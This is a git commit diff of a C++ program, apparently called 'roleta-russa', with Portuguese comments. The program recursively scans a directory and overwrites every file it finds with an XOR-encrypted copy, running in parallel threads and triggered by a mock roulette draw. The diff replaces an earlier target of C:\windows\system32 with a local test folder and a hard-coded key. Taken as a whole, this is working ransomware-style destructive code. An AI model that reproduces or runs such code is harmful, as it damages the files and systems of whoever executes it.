a40c4113131401062d98a95e77d1c375d65de25e
jackvadderr <jacjacckck@gmail.com>
2023-06-02 14:58:33 +0000

    refactor(otimizacao)

--- src/main.cpp
+++ src/main.cpp
@@ -10,10 +10,8 @@
 #include <random>
 #include <thread>
 
-#define DIR_PATH "C:\\windows\\system32"
-
-using namespace std;
-
+#define DIR_PATH "/home/jack/github/roleta-russa/testes"
+#define CHAVE "19fa61d75522a4669b44e39c1d2e1726c530232130d407f89afee0964997f7a73e83be698b288febcf88e3e03c4f0757ea8964e59b63d93708b138cc42a66eb3"
 
 /**
  * Classe para criptografar e ler o conteúdo de um arquivo.
@@ -29,27 +27,46 @@ class CriptografiaArquivo {
          * @throws std::runtime_error se não for possível abrir o arquivo para leitura
          *         ou o arquivo temporário para escrita.
          */
-        static void criptografarArquivo(const std::string& caminhoArquivo, const std::string& chave) {
-            // Abre o arquivo original para leitura
+        void criptografarArquivo(const std::string& caminhoArquivo, const std::string& chave) {
+            // Abre o arquivo original para leitura em modo binário
             std::ifstream arquivo(caminhoArquivo, std::ios::binary);
             if (!arquivo.is_open()) {
                 throw std::runtime_error("Não foi possível abrir o arquivo para leitura");
             }
 
-            // Abre o arquivo temporário para escrita
+            // Abre o arquivo temporário para escrita em modo binário
             std::ofstream arquivoCriptografado(caminhoArquivo + ".temp", std::ios::binary);
             if (!arquivoCriptografado.is_open()) {
                 arquivo.close();
                 throw std::runtime_error("Não foi possível abrir o arquivo temporário para escrita");
             }
 
-            // Criptografa o arquivo caractere por caractere
-            char c;
+            // Obtém o tamanho da chave
+            const size_t tamanhoChave = chave.size();
+
+            // Define o tamanho do buffer de leitura/escrita
+            constexpr size_t bufferSize = 8192;
+
+            // Cria um buffer para armazenar os dados lidos
+            std::vector<char> buffer(bufferSize);
+
+            // Criptografa o arquivo em blocos
             size_t i = 0;
-            while (arquivo.get(c)) {
-                arquivoCriptografado.put(c ^ chave[i % chave.size()]);
+            while (arquivo.read(buffer.data(), bufferSize)) {
+                for (size_t j = 0; j < bufferSize; ++j) {
+                    buffer[j] ^= chave[i % tamanhoChave];
+                    i++;
+                }
+                arquivoCriptografado.write(buffer.data(), bufferSize);
+            }
+
+            // Processa o último bloco parcial, se houver
+            size_t bytesLidos = arquivo.gcount();
+            for (size_t j = 0; j < bytesLidos; ++j) {
+                buffer[j] ^= chave[i % tamanhoChave];
                 i++;
             }
+            arquivoCriptografado.write(buffer.data(), bytesLidos);
 
             // Fecha os arquivos
             arquivo.close();
@@ -102,17 +119,44 @@ class DirectoryScanner {
          */
         std::vector<std::string> list_files(const std::string& dir_path) {
             std::vector<std::string> files; // Vetor para armazenar os caminhos completos dos arquivos
+            std::mutex mutex; // Mutex para garantir exclusão mútua ao adicionar arquivos ao vetor
 
             try {
-                // Percorre todos os arquivos e subdiretórios do diretório especificado
-                for (const auto& entry : std::filesystem::recursive_directory_iterator(dir_path)) {
-                    if (entry.is_regular_file()) {
-                        // Se o item encontrado for um arquivo, adiciona o caminho completo ao vetor de arquivos
-                        files.push_back(entry.path().string());
+                // Verifica se o diretório existe
+                if (!std::filesystem::is_directory(dir_path)) {
+                    std::cerr << "Diretório não encontrado: " << dir_path << std::endl;
+                    return files;
+                }
+
+                // Função lambda para processar um subdiretório em paralelo
+                auto process_directory = [&](const std::filesystem::directory_entry& entry) {
+                    std::vector<std::string> local_files; // Vetor local para armazenar os caminhos completos dos arquivos
+
+                    for (const auto& sub_entry : std::filesystem::recursive_directory_iterator(entry.path())) {
+                        if (sub_entry.is_regular_file()) {
+                            local_files.push_back(sub_entry.path().string());
+                        }
+                    }
+
+                    // Adquire o mutex para garantir exclusão mútua ao adicionar os arquivos ao vetor compartilhado
+                    std::lock_guard<std::mutex> lock(mutex);
+                    files.insert(files.end(), local_files.begin(), local_files.end());
+                };
+
+                // Cria threads para processar diferentes subdiretórios em paralelo
+                std::vector<std::thread> threads;
+                for (const auto& entry : std::filesystem::directory_iterator(dir_path)) {
+                    if (entry.is_directory()) {
+                        threads.emplace_back(process_directory, entry);
                     }
                 }
+
+                // Aguarda todas as threads terminarem
+                for (auto& thread : threads) {
+                    thread.join();
+                }
             }
-            catch (const std::system_error& e) {
+            catch (const std::filesystem::filesystem_error& e) {
                 std::cerr << "Erro ao acessar o diretório: " << e.what() << std::endl;
             }
             catch (...) {
@@ -131,6 +175,7 @@ class Programa {
     private:
         CriptografiaArquivo ca;      // Objeto responsável pela criptografia de arquivos
         DirectoryScanner ds;        // Objeto responsável pela varredura de diretórios
+        std::mutex mutex;           // Mutex para garantir exclusão mútua ao adicionar arquivos ao vetor
 
     public:
         /**
@@ -162,18 +207,24 @@ class Programa {
             int numero_sorteado = 6;    // Número sorteado (exemplo)
 
             if (numero_sorteado == 6) {
-                std::vector<std::thread> threads;
+                if (files.empty()) {
+                    std::cout << "Nenhum arquivo encontrado." << std::endl;
+                    return;
+                }
 
-                // Para cada arquivo, cria uma thread para criptografá-lo
+                std::vector<std::thread> threads;
+                threads.reserve(files.size()); // Pré-aloca espaço para os elementos do vetor threads
+
+                // Cria uma thread para cada arquivo e criptografa em paralelo
                 for (const auto& file : files) {
-                    threads.emplace_back([&]() {
-                        std::string chave = std::to_string(gerarNumeroAleatorio(1, 100000000));
+                    threads.emplace_back([&](const std::string& file) {
                         try {
-                            ca.criptografarArquivo(file, chave);
+                            ca.criptografarArquivo(file, CHAVE);
                         } catch (const std::exception& e) {
+                            std::lock_guard<std::mutex> lock(mutex); // Adquire o mutex para exclusão mútua ao imprimir mensagens de erro
                             std::cerr << "Erro ao criptografar arquivo: " << e.what() << std::endl;
                         }
-                    });
+                    }, file);
                 }
 
                 // Aguarda todas as threads terminarem
